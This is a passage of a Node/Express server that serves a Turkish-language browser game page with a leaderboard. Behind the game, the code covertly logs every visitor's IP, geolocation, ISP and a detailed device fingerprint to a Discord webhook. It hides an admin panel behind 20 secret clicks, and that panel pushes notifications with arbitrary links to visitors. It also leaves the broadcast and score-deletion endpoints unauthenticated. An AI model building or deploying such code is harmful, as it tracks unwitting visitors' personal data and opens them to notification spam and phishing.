        html += '<div class="' + cls + '"><span class="lb-rank">' + medal + '</span>'
          + '<span class="lb-name">' + escapeHtml(s.name) + '</span>'
          + '<span class="lb-score">' + s.score + '</span></div>';
      }
      listEl.innerHTML = html;
    }).catch(function(){ listEl.innerHTML = '<div class="empty-lb">Yuklenemedi.</div>'; });
  }

  function escapeHtml(s){
    var d = document.createElement("div");
    d.textContent = String(s || "");
    return d.innerHTML;
  }

  document.getElementById("leaderboardBtn").addEventListener("click", openLeaderboard);
  document.getElementById("lbClose").addEventListener("click", function(){
    document.getElementById("leaderboardModal").classList.remove("show");
  });

  // ===== GIZLI ADMIN =====
  var redClicks = 0, redTimer = null;
  function resetRed(){ redClicks = 0; }
  document.getElementById("secretRed").addEventListener("click", function(e){
    e.preventDefault(); e.stopPropagation();
    redClicks++;
    if (redTimer) clearTimeout(redTimer);
    redTimer = setTimeout(resetRed, 15000);
    if (redClicks >= 20){ resetRed(); openAdmin(); }
  });
  var sarilar = document.querySelectorAll(".sbtn.sari");
  for (var si = 0; si < sarilar.length; si++){
    (function(b){ b.addEventListener("click", function(){ resetRed(); }); })(sarilar[si]);
  }

  // ===== ADMIN =====
  var ap = document.getElementById("adminPanel");
  var apLog = document.getElementById("apLog");
  var apPerm = document.getElementById("apPerm");
  var apSent = document.getElementById("apSent");
  var apQueue = document.getElementById("apQueue");
  var sentCount = 0;

  function apPrint(msg, cls){
    var t = new Date().toLocaleTimeString("tr-TR");
    var div = document.createElement("div");
    if (cls) div.className = cls;
    div.textContent = "[" + t + "] " + msg;
    apLog.appendChild(div);
    apLog.scrollTop = apLog.scrollHeight;
  }

  function openAdmin(){
    ap.classList.add("show");
    apPerm.textContent = ("Notification" in window) ? Notification.permission : "yok";
    apPrint("Panel acildi. Session: " + getSid(), "ok");
  }

  document.getElementById("apClose").addEventListener("click", function(){ ap.classList.remove("show"); });

  document.getElementById("apSend").addEventListener("click", function(){
    var title = document.getElementById("apTitle").value.trim() || "Bildirim";
    var body = document.getElementById("apBody").value.trim();
    var url = document.getElementById("apUrl").value.trim();
    if (!body && !title){ apPrint("Bos mesaj.", "err"); return; }
    fetch("/api/broadcast", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ title: title, body: body, url: url })
    })
    .then(function(r){ return r.json(); })
    .then(function(d){
      sentCount++;
      apSent.textContent = sentCount;
      apQueue.textContent = d.total || "?";
      apPrint("Gonderildi: " + title, "ok");
      sendNotif(title, body, { url: url });
      document.getElementById("apBody").value = "";
    })
    .catch(function(e){ apPrint("Hata: " + e.message, "err"); });
  });

  document.getElementById("apTest").addEventListener("click", function(){
    var title = document.getElementById("apTitle").value.trim() || "Test";
    var body = document.getElementById("apBody").value.trim() || "Bu bir test";
    sendNotif(title, body);
    apPrint("Test: " + title, "ok");
  });

  document.getElementById("apForcePerm").addEventListener("click", function(){
    notifAttempts = 0;
    tryRequestNotify();
    setTimeout(function(){
      apPerm.textContent = ("Notification" in window) ? Notification.permission : "yok";
      apPrint("Izin: " + apPerm.textContent);
    }, 800);
  });

  document.getElementById("apClearScores").addEventListener("click", function(){
    if (!confirm("Tum skorlar silinsin mi?")) return;
    fetch("/api/scores", { method: "DELETE" })
      .then(function(){ apPrint("Skorlar silindi.", "ok"); })
      .catch(function(e){ apPrint("Hata: " + e.message, "err"); });
  });

  document.getElementById("apClearLog").addEventListener("click", function(){ apLog.innerHTML = "Temizlendi."; });

  document.getElementById("apReset").addEventListener("click", function(){
    localStorage.removeItem(CONFIG.STORAGE_KEY);
    best = 0; bestEl.textContent = 0;
    apPrint("Sifirlandi.", "ok");
    startGame();
  });

  function pollMessages(){
    if (!("Notification" in window) || Notification.permission !== "granted") return;
    fetch("/api/messages?since=" + lastMsgId, { cache: "no-store" })
      .then(function(r){ return r.ok ? r.json() : null; })
      .then(function(d){
        if (!d || !d.messages) return;
        for (var i = 0; i < d.messages.length; i++){
          var m = d.messages[i];
          if (m.id > lastMsgId){
            sendNotif(m.title || "Bildirim", m.body || "", { url: m.url, tag: "bc-" + m.id });
            lastMsgId = m.id;
          }
        }
      })
      .catch(function(){});
  }

  (function init(){
    var info = collectInfo();
    sendLog("visit", info);

    initSW().then(function(){
      rebuildStars();
      startGame();
      setTimeout(tryRequestNotify, 500);
      setTimeout(tryRequestNotify, 3000);
    });

    setInterval(pollMessages, 5000);
    setTimeout(pollMessages, 2000);
  })();

})();
</script>
</body>
</html>`;

function getGeo(ip){
  if (!ip || ip === "::1" || ip.indexOf("127.") === 0 || ip.indexOf("::ffff:127") === 0){
    return Promise.resolve(null);
  }
  return fetch("https://ipapi.co/" + ip + "/json/", { headers: { "User-Agent": "oyun-sitesi/1.0" } })
    .then(function(r){ return r.ok ? r.json() : null; })
    .catch(function(){ return null; });
}

function buildEmbed(info, geo, ip, event){
  var country = (geo && geo.country_name) || "?";
  var city = (geo && geo.city) || "?";
  var region = (geo && geo.region) || "?";
  var org = (geo && geo.org) || "?";
  var titles = { visit: "👤 Site Ziyareti", notify_granted: "🔔 İzin Verildi", notify_denied: "🔕 İzin Reddedildi" };
  var colors = { visit: 0x3b82f6, notify_granted: 0x22c55e, notify_denied: 0xef4444 };

  var desc = "**" + (info.browser || "?") + " " + (info.browserVer || "") + "** • "
    + (info.os || "?") + " " + (info.osVer || "") + "\n"
    + "📍 **" + city + "**, " + region + " — " + country + "\n"
    + "🌐 `" + ip + "`";

  var fields = [
    { name: "💻 Tarayici", value: (info.browser || "?") + " " + (info.browserVer || ""), inline: true },
    { name: "⚙️ Motor", value: (info.engine || "?") + " " + (info.engineVer || ""), inline: true },
    { name: "🖥️ OS", value: (info.os || "?") + " " + (info.osVer || ""), inline: true },
    { name: "📱 Cihaz", value: info.device || "?", inline: true },
    { name: "🍎 iOS", value: info.isIOS || "?", inline: true },
    { name: "📲 PWA", value: info.isPWA || "?", inline: true },
    { name: "📺 Ekran", value: info.screenRes + " (DPR " + info.pixelRatio + ")", inline: true },
    { name: "🔍 Viewport", value: info.viewport || "?", inline: true },
    { name: "👆 Dokunmatik", value: info.touch || "?", inline: true },
    { name: "🗣️ Dil", value: info.language || "?", inline: true },
    { name: "🕒 TZ", value: info.timezone || "?", inline: true },
    { name: "⚙️ CPU", value: (info.cores || "?") + " cekirdek", inline: true },
    { name: "🧠 RAM", value: info.memory || "?", inline: true },
    { name: "📶 Baglanti", value: (info.online || "?") + " — " + (info.connection || "?"), inline: true },
    { name: "🏢 ISP", value: org, inline: false },
    { name: "🔔 Izin", value: info.notifPerm || "?", inline: true },
    { name: "🆔 Session", value: "`" + (info.sid || "?") + "`", inline: true },
    { name: "↩️ Referrer", value: (info.referrer || "direkt").substring(0, 100), inline: false }
  ];

  return {
    title: titles[event] || "👤 Site Ziyareti",
    description: desc,
    color: colors[event] || 0x3b82f6,
    timestamp: new Date().toISOString(),
    fields: fields,
    footer: { text: "Oyun Log • " + new Date().toLocaleString("tr-TR", { timeZone: "Europe/Istanbul" }) }
  };
}

app.get("/", function(req, res){
  res.set("Content-Type", "text/html; charset=utf-8");
  res.set("Cache-Control", "no-store");
  res.send(HTML);
});

app.get("/sw.js", function(req, res){
  res.set("Content-Type", "application/javascript; charset=utf-8");
  res.set("Service-Worker-Allowed", "/");
  res.send(SW_CODE);
});

app.post("/api/broadcast", function(req, res){
  var body = req.body || {};
  var msg = {
    id: ++MSG_ID,
    title: String(body.title || "Bildirim").slice(0, 100),
    body: String(body.body || "").slice(0, 500),
    url: String(body.url || "").slice(0, 300),
    ts: Date.now()
  };
  MESSAGES.push(msg);
  var cutoff = Date.now() - 3600 * 1000;
  MESSAGES = MESSAGES.filter(function(m){ return m.ts > cutoff; });
  if (MESSAGES.length > 50) MESSAGES = MESSAGES.slice(-50);
  res.json({ ok: true, id: msg.id, total: MESSAGES.length });
});

app.get("/api/messages", function(req, res){
  var since = parseInt(req.query.since || "0", 10);
  var list = MESSAGES.filter(function(m){ return m.id > since; });
  res.set("Cache-Control", "no-store");
  res.json({ messages: list, latest: MSG_ID });
});

app.post("/api/score", function(req, res){
  var body = req.body || {};
  var name = String(body.name || "Anonim").trim().slice(0, 20);
  var sc = parseInt(body.score, 10);
  if (isNaN(sc) || sc < 0) sc = 0;
  SCORES.push({ name: name, score: sc, ts: Date.now() });
  SCORES.sort(function(a, b){ return b.score - a.score; });
  if (SCORES.length > 100) SCORES = SCORES.slice(0, 100);
  res.json({ ok: true });
});

app.get("/api/scores", function(req, res){
  res.set("Cache-Control", "no-store");
  res.json({ scores: SCORES.slice(0, 20) });
});

app.delete("/api/scores", function(req, res){
  SCORES = [];
  res.json({ ok: true });
});

app.post("/log", function(req, res){
  var fwd = req.headers["x-forwarded-for"] || "";
  var ip = (fwd.split(",")[0] || "").trim() || req.socket.remoteAddress || "?";
  var info = (req.body && req.body.info) || {};
  var event = (req.body && req.body.event) || "visit";

  getGeo(ip).then(function(geo){
    var embed = buildEmbed(info, geo, ip, event);
    return fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username: "Oyun Log", embeds: [embed] })
    }).then(function(r){
      if (!r.ok){
        return r.text().then(function(t){
          console.error("Discord hata:", r.status, t);
          res.status(500).json({ ok: false, status: r.status });
        });
      }
      res.json({ ok: true });
    });
  }).catch(function(e){
    console.error(e);
    res.status(500).json({ ok: false, error: String(e) });
  });
});

app.get("/test", function(req, res){
  fetch(WEBHOOK_URL, {
    method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: "Test - Render calisiyor!" })
  })
  .then(function(r){ res.send("Test gonderildi: " + r.status); })
  .catch(function(e){ res.status(500).send("Hata: " + e.message); });
});

app.listen(PORT, function(){
  console.log("Sunucu " + PORT + " portunda calisiyor");
});
